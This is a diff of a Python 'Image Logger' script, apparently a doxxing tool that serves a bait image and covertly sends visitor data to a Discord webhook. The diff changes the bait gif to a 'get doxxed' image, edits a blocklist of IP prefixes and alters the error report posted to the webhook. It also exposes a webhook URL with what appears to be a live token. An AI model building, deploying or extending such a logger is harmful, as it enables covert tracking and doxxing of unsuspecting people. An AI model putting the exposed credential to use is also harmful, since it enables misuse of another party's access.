@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1450027293756887215/zclbPt9N9ouAdr6Nr1KBACkP4r1dCen9thQnOIHqbP90mjxSWYHk_hFdRQMtJH92Fru5",
-    "image": "https://media.tenor.com/WlJsOVX2lysAAAAi/cat-tongue-cat.gif", # You can also have a custom image by using a URL argument
+    "image": "https://tenor.com/view/omori-doxxed-get-doxxed-idiot-gif-16209759885120265120", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -63,7 +63,7 @@ config = {
     # 4) Image 
 }
 
-blacklistedIPs = ("27", "104", "143", "164, 47.12.80.76") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+blacklistedIPs = ("27", "104", "143", "164,") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
 
 def botCheck(ip, useragent):
@@ -77,7 +77,7 @@ def botCheck(ip, useragent):
 def reportError(error):
     requests.post(config["webhook"], json = {
     "username": config["username"],
-    "content": "@everyone",
+    "content": "",
     "embeds": [
         {
             "title": "Image Logger - Error",
